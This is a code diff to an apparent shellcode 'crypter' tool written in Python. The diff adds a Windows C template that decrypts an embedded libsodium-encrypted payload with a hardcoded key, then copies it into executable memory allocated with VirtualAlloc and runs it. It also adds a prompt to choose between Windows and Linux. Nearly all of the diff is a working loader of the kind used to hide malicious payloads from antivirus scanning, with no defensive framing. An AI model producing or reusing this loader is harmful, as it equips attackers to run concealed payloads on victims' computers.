@@ -185,9 +185,63 @@ def shellcode_c_crypter(shellcode_file="", key=""):
     write_to_file("shell.c", c_template, "w")
     print("C code has been written to shell.c")
 
-def create_c_template(encrypted_data_array, key_array):
+def create_c_template(encrypted_data_array, key_array, platform=""):
     """Generate the C template code with the encrypted data and key."""
-    template = f"""
+    template_windows = f"""
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sodium.h>
+#include <windows.h>
+
+int main() {{
+    // Initialize libsodium
+    if (sodium_init() < 0) {{
+        return 1; // Panic
+    }}
+
+    // Define the encrypted data (including nonce and ciphertext)
+    unsigned char encrypted_data[] = {{ {encrypted_data_array} }};
+    unsigned int encrypted_data_len = sizeof(encrypted_data);
+
+    // Key
+    unsigned char key_bytes[] = {{ {key_array} }};
+
+    // Extract nonce from the encrypted data (first 24 bytes)
+    unsigned char nonce[crypto_secretbox_NONCEBYTES];
+    memcpy(nonce, encrypted_data, crypto_secretbox_NONCEBYTES);
+
+    // Prepare to decrypt
+    unsigned char decrypted[encrypted_data_len - crypto_secretbox_MACBYTES]; // MAC size to subtract
+    if (crypto_secretbox_open_easy(decrypted, encrypted_data + crypto_secretbox_NONCEBYTES, 
+                                    encrypted_data_len - crypto_secretbox_NONCEBYTES, nonce, key_bytes) != 0) {{
+        // Decryption failed
+        printf("Decryption failed!\\n");
+        return 1;
+    }}
+
+    // Allocate executable memory
+    void *exec_mem = VirtualAlloc(NULL, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (exec_mem == NULL) {{
+        perror("VirtualAlloc");
+        return 1;
+    }}
+
+    // Copy decrypted shellcode to executable memory
+    memcpy(exec_mem, decrypted, sizeof(decrypted));
+
+    // Execute shellcode
+    void (*shellcode)() = (void(*)())exec_mem; // Cast the memory to a function pointer
+    shellcode(); // Execute the shellcode
+
+    // Clean up
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+    
+    return 0;
+}}
+"""
+
+    template_linux = f"""
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -239,9 +293,18 @@ int main() {{
     
     return 0;
 }}
-
 """
-    return template
+    if not platform:
+        platform = input("Platform (windows/linux): ")
+        
+    if platform == "linux":
+        return template_linux
+    elif platform == "windows":
+        return template_windows
+    else:
+        print("Invalid platform. (windows/linux). Defaulting to Windows")
+        return template_windows
+
 
 
 def main():
